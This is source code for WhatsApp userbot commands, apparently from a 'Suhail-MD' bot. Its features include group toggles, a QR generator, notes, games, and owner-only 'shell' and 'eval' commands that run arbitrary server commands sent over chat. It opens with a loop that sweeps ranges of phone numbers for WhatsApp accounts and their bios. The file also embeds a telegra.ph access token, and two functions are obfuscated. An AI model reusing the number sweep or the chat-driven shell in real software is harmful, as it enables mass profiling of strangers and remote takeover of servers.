 let nobio = `\n*『 WhatsApp Account With No Bio』* \n`;
  let nobios='';
 let nowhatsapp = `*『 Numbers With No WhatsApp Account 』* \n\n`;
 for (let i = 0; i < randomxx; i++) 
 {
     const nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
     const status = nu.slice(0, randomLength).map(() => nu[Math.floor(Math.random() * nu.length)]).join('');
     const random = `${status}${nu[Math.floor(Math.random() * nu.length)]}`.slice(0, randomLength);
     const anu = await Void.onWhatsApp(`${number0}${i}${number1}`);
     const anuu = anu.length !== 0 ? anu : false;
     try 
     {
          const anu1 = await Void.fetchStatus(anu[0].jid);
          if (anu1 === '401' || anu1.status.length === 0) {  nobios += `wa.me/${anu[0].jid.split("@")[0]}\n`; } 
     } catch { nowhatsapp += `${number0}${i}${number1}\n`;  }
 }
 if(!nobios){ nobio = ''; } else {nobio += nobios+'\n' ;}
 return await citel.reply(`${nobio}${nowhatsapp}${Config.caption}`);
   
 })

















































































 cmd({
    pattern: "act",
    alias:['activate','active'],
    desc: "Switches for varios works.",
    category: "group",
    filename: __filename,
},
async(Void, citel, text,{ isCreator }) => {
    //-----------------------------------------
    if (!citel.isGroup) return citel.reply(tlang().group);
    const groupAdmins = await getAdmin(Void, citel)
    const botNumber = await Void.decodeJid(Void.user.id)
   //const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) :false;
    //-----------------------------------------
    if (!citel.isGroup) return citel.reply("This command is only for group")
    if (!text) return citel.reply(`❌ Please provide me term like like\n1-events\n2-antilink\n3-nsfw\n4-bot`)
    if (isCreator){console.log("this is a Bot Number in Act Functions")}
    else if (!isAdmins) return citel.reply("❌ This command is only for admin")
    switch (text.split(" ")[0]) {
        case 'antilink':
            {
                let checkgroup = await sck.findOne({ id: citel.chat })
                if (!checkgroup) {
                    await new sck({ id: citel.chat, antilink: "true" })
                        .save()
                    return citel.reply(' Antilink Enabled Successfully')
                } else {
                    if (checkgroup.antilink == "true") return citel.reply("Antilink was alredy enabled here.")
                    await sck.updateOne({ id: citel.chat }, { antilink: "true" })
                    citel.reply('Enabled antilink in current chat.')
                    return
                }
            }
            break
      
                  case 'economy':
            {
                let checkgroup = await sck.findOne({ id: citel.chat })
                if (!checkgroup) {
                    await new sck({ id: citel.chat, economy: "true" })
                        .save()
                    return citel.reply(' Economy Enabled Successfully')
                } else {
                    if (checkgroup.economy == "true") return citel.reply("Economy was alredy enabled.")
                    await sck.updateOne({ id: citel.chat }, { economy: "true" })
                    citel.reply('Economy enabled in current chat.')
                    return
                }
            }
            break
        case 'events':
            {
                let checkgroup = await sck.findOne({ id: citel.chat })
                if (!checkgroup) {
                    await new sck({ id: citel.chat, events: "true" })
                        .save()
                    return citel.reply("Successfully Enabled *Events*")
                } else {
                    if (checkgroup.events == "true") return citel.reply("*Events* are already enabled")
                    await sck.updateOne({ id: citel.chat }, { events: "true" })
                    return citel.reply("Successfully Enabled *Events*")
                }
            }
            break
        case 'cardgame':
            {
                let checkgroup = sck.findOne({ id: citel.chat })
                if (!checkgroup) {
                    await new sck({ id: citel.chat, cardgame: "active" })
                        .save()
                    return citel.reply("Successfully Enabled *Card Game*")
                } else {
                    if (checkgroup.cardgame == "active") return citel.reply("*Card Game* was already enabled")
                    await sck.updateOne({ id: citel.chat }, { cardgame: "active" })
                    return citel.reply("Successfully Enabled *Card Game.*")
                }
            }
            break
        case 'nsfw':
            {
                let checkgroup = await sck.findOne({ id: citel.chat })
                if (!checkgroup) {
                    await new sck({ id: citel.chat, nsfw: "true" })
                        .save()
                    return citel.reply("Successfully Enabled *NSFW*")
                } else {
                    if (checkgroup.nsfw == "true") return citel.reply("*NSFW* is already enabled")
                    await sck.updateOne({ id: citel.chat }, { nsfw: "true" })
                    citel.reply("Successfully Enabled *NSFW*")
                    return
                }
            }
            break
        default:
            {
                citel.reply("Please provide me term like.\n1-events\n2-antilink\n3-nsfw\n4-economy")
            }
    }
}
) 



































































































cmd({
    pattern: "deact",
alias : ['deactive','deactivate'],
    desc: "Switches for varios works.",
    category: "group",
    filename: __filename
},
async(Void, citel, text,{ isCreator }) => {
    //-----------------------------------------	
    if (!citel.isGroup) return citel.reply(tlang().group);
    const groupAdmins = await getAdmin(Void, citel)
    const botNumber = await Void.decodeJid(Void.user.id)
    const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
    //-----------------------------------------  
    if (!citel.isGroup) return citel.reply("This feature in only for Group.")
    if (!text) return citel.reply(`❌ Please provide me term like like\n1-events\n2-antilink\n3-nsfw\n4-cardgame\n5-bot`)
    if (isCreator){console.log("this is a Bot Number in Deact Functions")}
   else if (!isAdmins) return citel.reply("❌ This command is only for admin")
    switch (text.split(" ")[0]) {
       case 'antilink':
           {
               let checkgroup = await sck.findOne({ id: citel.chat })
               if (!checkgroup) {
                   await new sck({ id: citel.chat, antilink: "false" })
                       .save()
                   return citel.reply(' Antilink disabled Successfully')
               } else {
                   if (checkgroup.antilink == "false") return citel.reply("Antilink was alredy disabled.")
                   await sck.updateOne({ id: citel.chat }, { antilink: "false" })
                   citel.reply('disabled antilink in current chat.')
                   return
               }
           }
           break
                  case 'economy':
           {
               let checkgroup = await sck.findOne({ id: citel.chat })
               if (!checkgroup) {
                   await new sck({ id: citel.chat, economy: "false" })
                       .save()
                   return citel.reply(' Economy disabled Successfully')
               } else {
                   if (checkgroup.economy == "false") return citel.reply("Economy was alredy disabled.")
                   await sck.updateOne({ id: citel.chat }, { economy: "false" })
                   citel.reply('disabled Economy in current chat.')
                   return
               }
           }
           break
           case 'events':
               {
                   let checkgroup = await sck.findOne({ id: citel.chat })
                   if (!checkgroup) {
                       await new sck({ id: citel.chat, events: "false" })
                           .save()
                       return citel.reply("Successfully disabled *Events*")
                   } else {
                       if (checkgroup.events == "false") return citel.reply("*Events* are already disabled")
                       await sck.updateOne({ id: citel.chat }, { events: "false" })
                       return citel.reply("Successfully disabled *Events*")
                   }
               }
               break
           case 'cardgame':
               {
                   let checkgroup = sck.findOne({ id: citel.chat })
                   if (!checkgroup) {
                       await new sck({ id: citel.chat, cardgame: "deactive" })
                           .save()
                       return citel.reply("Successfully disabled *Card Game*")
                   } else {
                       if (checkgroup.cardgame == "deactive") return citel.reply("*Card Game* was already disabled")
                       await sck.updateOne({ id: citel.chat }, { cardgame: "deactive" })
                       return citel.reply("Successfully disabled *Card Game.*")
                   }
               }
               break
           case 'nsfw':
               {
                   let checkgroup = await sck.findOne({ id: citel.chat })
                   if (!checkgroup) {
                       await new sck({ id: citel.chat, nsfw: "false" })
                           .save()
                       return citel.reply("Successfully disabled *NSFW*")
                   } else {
                       if (checkgroup.nsfw == "false") return citel.reply("*NSFW* is already disabled")
                       await sck.updateOne({ id: citel.chat }, { nsfw: "false" })
                       citel.reply("Successfully disabled *NSFW*")
                       return
                   }
               }
               break
           default:
               {
                   citel.reply("Please provide me term like.\n1-events\n2-antilink\n3-nsfw\n4-cardgame")
               }
    }
}
)




































































































cmd({
    pattern: "qr",
    category: "user",
    filename: __filename,
    desc: "Sends CitelsVoid Qr code to scan and get your session id."
},
async(Void, citel, text) => {
    if (!text) return citel.reply(`*Provide me Text To Get QR*`);
    let h =`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${text}`;
    let buttonMessaged = 
    {
        image: { url: h },
        caption: `*_Scan Qr To Get You Text_*`,
        footer: ` Session bY >> ${Config.caption}`,
        headerType: 4,
    };
    return await Void.sendMessage(citel.chat, buttonMessaged );
 
    /*
    let buttonMessaged = {
        image: { url: 'https://secktorbot.onrender.com/' },
        caption: `*_Scan Qr within 15 seconds_*\nYou'll get session id in your log number.`,
        footer: ` Session bY >> sᴜʜᴀɪʟ ᴛᴇᴄʜ ɪɴғᴏ \n www.youtube.com/c/SuhailTechInfo`,
        headerType: 4,
        contextInfo: {
            externalAdReply: {
                title: 'mY bOT Session',
                body: 'Get you Session ID',
                thumbnail: log0,
                mediaType: 2,
                mediaUrl: `https://i.imgur.com/NpA3ZsJ.jpeg`,
                sourceUrl: `WWW.YOUTUBE.COM/c/SUHAILTECHINFO`,
            },

        },

    };
    await Void.sendMessage(citel.chat, buttonMessaged, {  quoted: citel });

*/
})

//--------------------------------------------------------------------------- 
cmd({
pattern: "rmbg",
alias : ['removebg'],
category: "misc",
filename: __filename,
desc: "Remove image Background."
},
async(Void, citel, text) => {
const _0x16b89c=_0x49c2;function _0x5e60(){const _0x33515f=['log','post','unlinkSync','send','caption','reply','524478FLbaqg','671116swmKkp','Uhh\x20Please,\x20Reply\x20To\x20An\x20Image/Video','1030BtYSxu','https://api.remove.bg/v1.0/removebg','187699OYwNUd','93599mPRWgy','auto','data','3341514nVKyCN','225184Osvztc','downloadAndSaveMediaMessage','catch','imageMessage','*_Uhh\x20Dear,\x20Please\x20provide\x20Valid\x20RemoveBg\x20Key_*\x0a\x0a\x20_Get\x20RemoveBg\x20api\x20key\x20from\x20remove.bg_\x0a\x20_then\x20Put\x20it\x20in\x20var\x20\x22REMOVE_BG_KEY\x22_\x0a\x0a','25NTBVPR','sending\x20removebg\x20image...!','14IYDGua','4141704bMSerR','REMOVE_BG_KEY','quoted','477ZxuHEt'];_0x5e60=function(){return _0x33515f;};return _0x5e60();}(function(_0x3045c0,_0x56c7b6){const _0x146dc7=_0x49c2,_0x492ef5=_0x3045c0();while(!![]){try{const _0x1f6d31=-parseInt(_0x146dc7(0xf0))/0x1*(-parseInt(_0x146dc7(0xe0))/0x2)+parseInt(_0x146dc7(0xd8))/0x3+-parseInt(_0x146dc7(0xec))/0x4+-parseInt(_0x146dc7(0xde))/0x5*(-parseInt(_0x146dc7(0xeb))/0x6)+parseInt(_0x146dc7(0xe1))/0x7+-parseInt(_0x146dc7(0xd9))/0x8*(parseInt(_0x146dc7(0xe4))/0x9)+parseInt(_0x146dc7(0xee))/0xa*(-parseInt(_0x146dc7(0xd5))/0xb);if(_0x1f6d31===_0x56c7b6)break;else _0x492ef5['push'](_0x492ef5['shift']());}catch(_0x1a9a50){_0x492ef5['push'](_0x492ef5['shift']());}}}(_0x5e60,0xe0b62));if(!citel[_0x16b89c(0xe3)])return await citel[_0x16b89c(0xea)]('*Reply\x20Any\x20Image\x20To\x20Remove\x20Background*');let mime=citel[_0x16b89c(0xe3)]['mtype'];if(mime!=_0x16b89c(0xdc))return await citel[_0x16b89c(0xea)](_0x16b89c(0xed));let media=await Void[_0x16b89c(0xda)](citel[_0x16b89c(0xe3)]),anu=await TelegraPh(media);try{await fs[_0x16b89c(0xe7)](media);}catch(_0x14f72d){}const formData={'image_url':anu,'size':_0x16b89c(0xd6)};function _0x49c2(_0x16a55d,_0x16a672){const _0x5e6049=_0x5e60();return _0x49c2=function(_0x49c2f0,_0x45b252){_0x49c2f0=_0x49c2f0-0xd5;let _0x43a2e2=_0x5e6049[_0x49c2f0];return _0x43a2e2;},_0x49c2(_0x16a55d,_0x16a672);}axios[_0x16b89c(0xe6)](_0x16b89c(0xef),formData,{'headers':{'X-Api-Key':Config[_0x16b89c(0xe2)]},'responseType':'arraybuffer'})['then'](_0x466f9f=>{const _0x441490=_0x16b89c;console[_0x441490(0xe5)](_0x441490(0xdf));const _0x5b34e5=Buffer['from'](_0x466f9f[_0x441490(0xd7)],'binary');return citel[_0x441490(0xe8)](_0x5b34e5,{'caption':Config[_0x441490(0xe9)]},'image');})[_0x16b89c(0xdb)](_0x46980f=>{const _0x3d5c75=_0x16b89c;return citel[_0x3d5c75(0xe8)](_0x3d5c75(0xdd)+Config[_0x3d5c75(0xe9)]);});


})

//---------------------------------------------------------------------------

cmd({
    pattern: "url",
    alias : ['createurl'],
    category: "misc",
    filename: __filename,
    desc: "image to url."
},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image/Video To Get Url*`)
    let mime = citel.quoted.mtype
    if(mime !='videoMessage' && mime !='imageMessage' ) return await citel.reply("Uhh Please, Reply To An Image/Video")
    let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
    let anu = await TelegraPh(media);
    await citel.reply(util.format(anu));
    return await fs.unlinkSync(media);
})

//---------------------------------------------------------------------------
cmd({
    pattern: "trt",
    alias :['translate'],
    category: "misc",
    filename: __filename,
    desc: "Translate\'s given text in desird language."
},
async(Void, citel, text) => {
    if(!text && !citel.quoted) return await citel.reply(`*Please Give Me Text. Example: _${prefix}trt en Who are you_*`);
    const translatte = require("translatte");
    let lang = text ? text.split(" ")[0].toLowerCase() : 'en';
    if (!citel.quoted)  { text = text.replace( lang , "");  }
    else { text = citel.quoted.text; }
    var whole = await translatte(text, { from:"auto",  to: lang , });
    if ("text" in whole) { return await citel.reply(whole.text); }

}
)
//---------------------------------------------------------------------------


cmd({
    pattern: "shell",
    category: "owner",
    filename: __filename,
    desc: "Runs command in Heroku(server) shell."
},
async(Void, citel, text,{ isCreator }) => {
     if (!isCreator) return citel.reply(tlang().owner)
     if(!text) return citel.reply("*Uhh PLease, Provide A Command to Run Heroku*")
     const { exec } = require("child_process")
     exec(text, (err, stdout) => {
             if (err) return citel.reply(`----${tlang().title}----\n\n` + err)
             if (stdout) { return citel.reply(`----${tlang().title}----\n\n` + stdout)  }
     })
}) 


//---------------------------------------------------------------------------


cmd({
    pattern: "eval",
    category: "owner",
    filename: __filename,
    desc: "Runs js code on node server."
},
async(Void, citel, text,{ isCreator }) => {
       if (!isCreator)  return citel.reply(tlang().owner)
       if(!text) return citel.reply("*Uhh PLease, Provide A Query To Run Master*")
       try {
           let resultTest = eval('const a = async()=>{\n' + text + '\n}\na()');
           if (typeof resultTest === "object") await citel.reply(JSON.stringify(resultTest));
           else await citel.reply(resultTest.toString());
       } catch (err) { return  await citel.reply(err.toString()); }
})


//---------------------------------------------------------------------------
/*cmd({
    pattern: "delnote",
    category: "owner",
    filename: __filename,
    desc: "Deletes note from db."
},
async(Void, citel, text,{ isCreator }) => {
    const { tlang } = require('../lib/scraper')
    if (!isCreator) return citel.reply(tlang().owner)
    if(!text) return citel.reply("*Uhh PLease, Provide A Note Id. Ex .delnote 1*")
    await delnote(text.split(" ")[0])
     return citel.reply(`Id: ${text.split(" ")[0]}\'s note has been deleted from mongodb.`)

}
)
*/
//---------------------------------------------------------------------------

/*cmd({
    pattern: "delallnotes",
    category: "owner",
    filename: __filename,
    desc: "Deletes all notes from db."
},
async(Void, citel, text, isCreator) => {
    const { tlang } = require('../lib/scraper')
    if (!isCreator) return citel.reply(tlang().owner)


}
)

*/
//---------------------------------------------------------------------------

if(Config.WORKTYPE != 'private')
{
cmd({
    pattern: "ban",
    category: "owner",
    filename: __filename,
    desc: "Bans user from using bot."
},
async(Void, citel, text,{ isCreator}) => {
    if (!isCreator) return citel.reply(tlang().owner)
    try 
    {
        let users = citel.quoted ? citel.quoted.sender : citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
        if (!users) return citel.reply(`❌ Please mention any user ${tlang().greet}.`)
        let pushnamer = Void.getName(users);
        sck1.findOne({ id: users }).then(async(usr) => 
        {
            if (!usr) 
            {
                await new sck1({ id: users, ban: "true" }).save()
                return citel.reply(`_Banned ${usr.name} from Using Commands._`)
            } 
            if (usr.ban == "true") return citel.reply(`${pushnamer} is already Banned from Using Commands`)
            await sck1.updateOne({ id: users }, { ban: "true" })
            return citel.reply(`_Successfully Banned ${usr.name} from Using Commands._`)
        })
    } catch (e) {  return citel.reply("*Please Reply/Mention Any User.❌*")  }


})
//---------------------------------------------------------------------------
cmd({
    pattern: "unban",
    category: "misc",
    filename: __filename,
    desc: "Unbans banned user (from using bot)."
},
async(Void, citel, text,{ isCreator }) => {
    if (!isCreator) return citel.reply(`This command is only for my Owner`)
    try 
    {
        let users = citel.quoted ? citel.quoted.sender : citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
        if (!users) return citel.reply("Please mention any user.❌")
        let pushnamer = Void.getName(users);
        sck1.findOne({ id: users }).then(async(usr) =>
        { // console.log(usr.ban);
            if (!usr) { return citel.reply(`${pushnamer} is unbanned.`);}
            if (usr.ban !== "true") return await citel.reply(`${usr.name} is already unbanned.`);
            await sck1.updateOne({ id: users }, { ban: "false" })
            return await citel.reply(`${usr.name} is free as a bird now`);
        })
    } catch {  return citel.reply("Please mention any user.❌");  }
})
}
//---------------------------------------------------------------------------
//                  ADD NOTE  COMMANDS
//---------------------------------------------------------------------------
/*
cmd({
    pattern: "addnote",
    category: "owner",
    desc: "Adds a note on db.",
    filename: __filename
},
async(Void, citel, text,{ isCreator }) => {
    if (!isCreator) return citel.reply(tlang().owner)
    if (!text) return citel.reply(`🔍 *Please Provide Text To Save In Notes*`)




}
)
*/
//---------------------------------------------------------------------------
cmd({
pattern: "notes",
alias : ['note'],
category: "owner",
filename: __filename,
desc: "Shows list of all notes."
},
async(Void, citel, text,{ isCreator }) => {
const { tlang } = require('../lib')
if (!isCreator) return citel.reply(tlang().owner)
let txt = `╭───── *『 MONGODB NOTES 』* ───◆
┃ Here You Can Store Notes For Later Use
┃ *------------------------------------------*
┃  ┌┤  *✯---- ADD NEW NOTE ----⦿*
┃  │✭ *Cmd :* ${prefix}notes add 'Your Text'
┃  │✭ *Usage :* Save Text in MongoDb Server
┃  ╰───────────────────◆
┃
┃  ┌┤  *✯---- GET ALL NOTES ----⦿*
┃  │✭ *Cmd :* ${prefix}notes all
┃  │✭ *Usage :* Read/Get All Saved Notes 
┃  ╰───────────────────◆
┃
┃  ┌┤  *✯---- DELETE A NOTE ----⦿*
┃  │✭ *Cmd :* ${prefix}notes del 'note id'
┃  │✭ *Usage :* Delete A Single Note By ID Number 
┃  ╰───────────────────◆
┃
┃  ┌┤  *✯---- DELETE ALL NOTES ----⦿*
┃  │✭ *Cmd :* ${prefix}notes delall
┃  │✭ *Usage :* Delete All Saved Notes 
┃  ╰───────────────────◆
╰━━━━━━━━━━━━━━━━━━━━━━──⊷` ; 


if (!text) return await citel.reply(txt);
if(text.split(' ')[0].toLowerCase() === "add"  || text.split(' ')[0].toLowerCase() === "new" )
{
     let txt = text.replace("add", "").replace("new", "")
     await addnote(txt)
    return await citel.reply(`New note "${txt}" added in mongodb.`)
}
else if(text.split(' ')[0].toLowerCase() === "all")
{
    const note_store = new Array()
    let leadtext = `*All Available Notes are:-*\n\n`
    leadtext += await allnotes()
    return await citel.reply(leadtext)
}
else if(text.split(' ')[0].toLowerCase() === "delall")
{
await delallnote()
return await citel.reply(`All notes deleted from mongodb.`)
}
else if(text.split(' ')[0].toLowerCase() === "del")
{
try 
{
    let id = text.split(' ')[1];
    if (!id || isNaN(id)) { return citel.reply("Uhh Please, Provide a Numeric Note ID. Example: .delnote 1"); }
    await delnote(id)
    //return citel.reply(`Id: ${text.split(" ")[0]}\'s note has been deleted from mongodb.`)
    return await citel.reply(`Note with ID : ${id} has been deleted from MongoDB.`);
} catch (error) {return citel.reply("Uhh Please, Provide a Note ID. Example: .notes del 1"); }

}
else { return await citel.reply(txt) ; }

})

//---------------------------------------------------------------------------
cmd({
    pattern: "alive",
    category: "general",
    filename: __filename,
    desc: "is bot alive??"
},
async(Void, citel, text, {isCreator}) => {
  let get = text;
  let alivemessage = `*ι αм σηℓιηє нσω ¢αη ι нєℓρ уσυ* \n\n_ι αм ᴍυℓтι ԃєνιᴄє ωнαтѕαρρ вσт_ \n_Cʀєαtєd вყ : ѕυнαιℓ tєᴄʜ info_\n_If any query : wa.me/923184474176_\n\n\n*_Update Alive Message by adding text with Alive_* \n*Eg: _.alive Your_Alive_Message_*`;
  let urll = '';     
  let image = false;
  let video = false;
  
if(isCreator && text != "")
{
let aliv = await alive.findOne({ id:"1" }) || await new alive({ id:"1"}).save();
if (text.startsWith("get")) return citel.reply(aliv.get);
if (text.toLowerCase().startsWith("info") ||  text.toLowerCase().startsWith("settings") ){
let cap = `*sᴜʜᴀɪʟ-ᴍᴅ • ᴀʟɪᴠᴇ ᴍᴇssᴀɢᴇ sᴇᴛᴛɪɴɢs*\n\n*KeyWords for Alive Message:*\n &user :`+ " ```To add user name,```\n &uptime: ```To add Uptime of bot,```\n &line : ```To add random pickup Line,```\n &quote: ```To add random quote with auther,```"+`\n\n*Update Alive by adding text with Alive*\n`+"```.alive Your_Alive_Message_here```"+`\n\n*Also Add photo and video url in Alive*\n`+"```.alive Your_Alive_Message_here``` https://telegra.ph/file/ec9bc5038601821f2eb84.jpg"+`\n\n*Alive Message With Url And All Keywords*\n`+"```.alive``` url_here \n```Hey &user``` 🍂\n```I Am Suhail-Md, A Multidevice Whatsapp User Bot.```\nBot alive since ```&uptime```\n*Quote:* ```&quote```\n*Pickup Line:* ```&line```\n\n"
return await Void.sendMessage(citel.chat, {image: { url: await botpic()} , caption:cap+Config.caption},{quoted : citel });
} 
const linkPattern = /(https?:\/\/\S+)/gi;
const imageExtensions = ['.jpg', '.jpeg', '.png'];
const videoExtensions = ['.mp4', '.avi', '.mov', '.mkv', '.gif'];
let match = text.match(linkPattern) || false ; 
if(match)
{
    let i = 0;
    while (i < match.length && !image && !video ) 
    {
          urll = match[i];
          const extension = urll.substring(urll.lastIndexOf('.')).toLowerCase();
          if (imageExtensions.includes(extension)) { image = true;  video = false; } 
          else if (videoExtensions.includes(extension)) { video = true; image = false; }
          else { console.log(`Unknown link: ${urll}`)  }
          i++;
     }
}
if( video || image) { text = text.replace(urll, ''); }
await alive.updateOne({ id: '1' }, { text: text, get : get, url: urll,  image: image,   video: video });
}
let aliv = await alive.findOne({ id:"1" }) || await new alive({ id:"1"}).save() ;   
alivemessage = aliv.text;
if(alivemessage.includes('&quote')){
var quoo = await axios.get(`https://favqs.com/api/qotd`);
let quote = `${quoo.data.quote.body} By ${quoo.data.quote.author}`; 
alivemessage = alivemessage.replace('&quote', quote);
}
alivemessage = alivemessage.replace('&uptime', runtime(process.uptime())).replace('&user', citel.pushName).replace('&line', await (await fetchJson('https://api.popcat.xyz/pickuplines')).pickupline)  ;
 

  image = aliv.image || false;
  video=aliv.video || false ;
  urll = aliv.url || await botpic() ;

  
const alivtxt = `${alivemessage}\n\n*Type ${prefix}menu for my command list.*`;
const messageOptions = image ? { image: { url: urll }, caption: alivtxt }
                : video? { video: { url: urll },gifPlayback: true, caption: alivtxt }
                : { image: { url: await botpic() }, caption: alivtxt };

return Void.sendMessage(citel.chat, messageOptions,{quoted : citel });
}
)




















cmd({
    pattern: "pastebin",
    desc: "To check ping",
    category: "converter",
    filename: __filename,
},
async(Void, citel,text) => {
if (!text) { text=citel.quoted.text;}
    if(!text) return citel.reply('Please reply to any text to get link.');
    let data = await pastebin.createPaste(text, "Suhail Tech Info");
    return citel.reply('_Here is your link._\n'+data+'\n*Click to Get Your Text*');
}
);
//----------------------------------------------- ---------------------------
cmd({
    pattern: "paste",
    desc: "create paste of text.",
    category: "converter",
    filename: __filename,
},
async(Void, citel,text) => {
let a = citel.quoted ? citel.quoted.text : citel.text;
let { data } = await axios.get(`https://api.telegra.ph/createPage?access_token=d3b25feccb89e508a9114afb82aa421fe2a9712b963b387cc5ad71e58722&title=Secktor-Md+Bot&author_name=SamPandey001&content=[%7B"tag":"p","children":["${a.replace(/ /g,'+')}"]%7D]&return_content=true`);
return citel.reply(`*Paste created on telegraph*\nName:-${util.format(data.result.title)} \nUrl:- ${util.format(data.result.url)}`)
}
);








































































cmd(
    {
      pattern: "dice",
      desc: "Rolling Dice Game",
      filename: __filename,
      category: "game",
    },
    async (Void,citel,text) => {        
      function _0x1057(){const _0x1197c1=['19265RxwKNW','780DDnVuc','sᴜʜᴀɪʟ-ᴍᴅ','3528awUTID','length','621548LyOqYd','1498381wAYdEg','1612210HskIPI','chat','18aDiqRh','22YBynzo','42384744BVxsBD','6️⃣','5️⃣','4️⃣','sendMessage','7552ClpecV','random','2RtaivP','5267941SjazyO','floor','ᴅɪᴄᴇ','1️⃣'];_0x1057=function(){return _0x1197c1;};return _0x1057();}function _0x42fa(_0x59f5c3,_0x27342d){const _0x105742=_0x1057();return _0x42fa=function(_0x42fa63,_0x296206){_0x42fa63=_0x42fa63-0x189;let _0x13f68a=_0x105742[_0x42fa63];return _0x13f68a;},_0x42fa(_0x59f5c3,_0x27342d);}const _0x3f5752=_0x42fa;(function(_0x515ee8,_0x26c5b6){const _0x24734b=_0x42fa,_0x34fa6f=_0x515ee8();while(!![]){try{const _0x4cca3a=-parseInt(_0x24734b(0x19d))/0x1*(parseInt(_0x24734b(0x192))/0x2)+-parseInt(_0x24734b(0x189))/0x3*(parseInt(_0x24734b(0x19c))/0x4)+parseInt(_0x24734b(0x197))/0x5*(parseInt(_0x24734b(0x198))/0x6)+-parseInt(_0x24734b(0x193))/0x7+-parseInt(_0x24734b(0x190))/0x8*(-parseInt(_0x24734b(0x19a))/0x9)+-parseInt(_0x24734b(0x19e))/0xa*(parseInt(_0x24734b(0x18a))/0xb)+parseInt(_0x24734b(0x18b))/0xc;if(_0x4cca3a===_0x26c5b6)break;else _0x34fa6f['push'](_0x34fa6f['shift']());}catch(_0x430693){_0x34fa6f['push'](_0x34fa6f['shift']());}}}(_0x1057,0xdb10c));try{const randomIndex=Math['floor'](Math[_0x3f5752(0x191)]()*stickers[_0x3f5752(0x19b)]),randomSticker=stickers[randomIndex];return await Void['sendMessage'](citel[_0x3f5752(0x19f)],{'sticker':{'url':randomSticker},'packname':_0x3f5752(0x195),'author':_0x3f5752(0x199)});}catch(_0x141513){const randomNumber=Math[_0x3f5752(0x194)](Math[_0x3f5752(0x191)]()*0x6),diceEmoji=['⚀','⚁','⚂','⚃','⚄','⚅'],reactEmoji=[_0x3f5752(0x196),'2️⃣','3️⃣',_0x3f5752(0x18e),_0x3f5752(0x18d),_0x3f5752(0x18c)];let index=Math[_0x3f5752(0x194)](Math[_0x3f5752(0x191)]()*diceEmoji[_0x3f5752(0x19b)]),msg=await Void['sendMessage'](citel['chat'],{'text':diceEmoji[index]});return await Void[_0x3f5752(0x18f)](citel[_0x3f5752(0x19f)],{'react':{'text':reactEmoji[index],'key':msg['key']}});}
    })
   
  cmd(
    {
      pattern: "delttt",
      desc: "deletes TicTacToe running session.",
      filename: __filename,
      category: "game",
    },
    async (Void,citel,text,{isCreator}) => {
          if (!citel.isGroup) return citel.reply(tlang().group);
          const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
          const participants = citel.isGroup ? await groupMetadata.participants : "";
          const groupAdmins = await getAdmin(Void, citel)
          const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
          if(!isAdmins && !isCreator) return citel.reply('This command is only for Group Admin and my owner.')
           this.game = this.game ? this.game : false
           if (
          Object.values(this.game).find(
            (room) =>
              room.id.startsWith("tictactoe")
          )
        ) {
          delete this.game
          return citel.reply(`_Successfully Deleted running TicTacToe game._`);
          } else {  return citel.reply(`No TicTacToe game🎮 is running.`)}
  
  
  
    })
    
  cmd(
    {
      pattern: "ttt",
      desc: "Play TicTacToe",
      filename: __filename,
      category: "game",
    },
    async (Void,citel,text) => {
      if (!citel.isGroup) return citel.reply(tlang().group);
      let {prefix} = require('../lib')
      {
        let TicTacToe = require("../lib/ttt");
        this.game = this.game ? this.game : {};
        if ( Object.values(this.game).find( (room) => room.id.startsWith("tictactoe") && [room.game.playerX, room.game.playerO].includes(citel.sender))) return citel.reply("_A game is already going on_");
        let room = Object.values(this.game).find((room) =>  room.state === "WAITING" && (text ? room.name === text : true)  );
        if (room) {
          room.o = citel.chat;
          room.game.playerO = citel.sender || citel.mentionedJid[0] 
          room.state = "PLAYING";
          let arr = room.game.render().map((v) => {
            return {
              X: "❌",
              O: "⭕",
              1: "1️⃣",
              2: "2️⃣",
              3: "3️⃣",
              4: "4️⃣",
              5: "5️⃣",
              6: "6️⃣",
              7: "7️⃣",
              8: "8️⃣",
              9: "9️⃣", 
            }[v];
          });
          let str = `
  Current turn: @${room.game.currentTurn.split("@")[0]}
  Room ID: ${room.id}
  ${arr.slice(0, 3).join("  ")}
  ${arr.slice(3, 6).join("  ")}
  ${arr.slice(6).join("  ")}
  `;
  
          return await Void.sendMessage(citel.chat, { text: str, mentions: [room.game.currentTurn], });
        } else {
          room = {
            id: "tictactoe-" + +new Date(),
            x: citel.chat,
            o: "",
            game: new TicTacToe(citel.sender, "o"),
            state: "WAITING",
          };
          if (text) room.name = text;
          citel.reply("_Waiting for player,use .ttt to join this game._ ");
          this.game[room.id] = room;
        }
      }
    }
  );
  
  cmd({ on: "text" },
    async (Void,citel,text) => {
      if(!citel.isGroup) return
      let {prefix} = require('../lib')
      this.game = this.game ? this.game : {};
      let room = Object.values(this.game).find(
        (room) =>
          room.id &&
          room.game &&
          room.state &&
          room.id.startsWith("tictactoe") &&
          [room.game.playerX, room.game.playerO].includes(citel.sender) &&
          room.state == "PLAYING"
      );
  
      if (room) {
        let ok;
        let isWin = !1;
        let isTie = !1;
        let isSurrender = !1;
        if (!/^([1-9]|(me)?give_up|surr?ender|off|skip)$/i.test(citel.text)) return;
        isSurrender = !/^[1-9]$/.test(citel.text);
        if (citel.sender !== room.game.currentTurn) {  if (!isSurrender) return !0;  }
        if (
          !isSurrender &&
          1 >
            (ok = room.game.turn(
              citel.sender === room.game.playerO,
              parseInt(citel.text) - 1
            ))
        ) {
          citel.reply(
            {
              "-3": "The game is over.",
              "-2": "Invalid",
              "-1": "_Invalid Position_",
              0: "_Invalid Position_",
            }[ok]
          );
          return !0;
        }
        if (citel.sender === room.game.winner) isWin = true;
        else if (room.game.board === 511) isTie = true;
        let arr = room.game.render().map((v) => {
          return {
            X: "❌",
            O: "⭕",
            1: "1️⃣",
            2: "2️⃣",
            3: "3️⃣",
            4: "4️⃣",
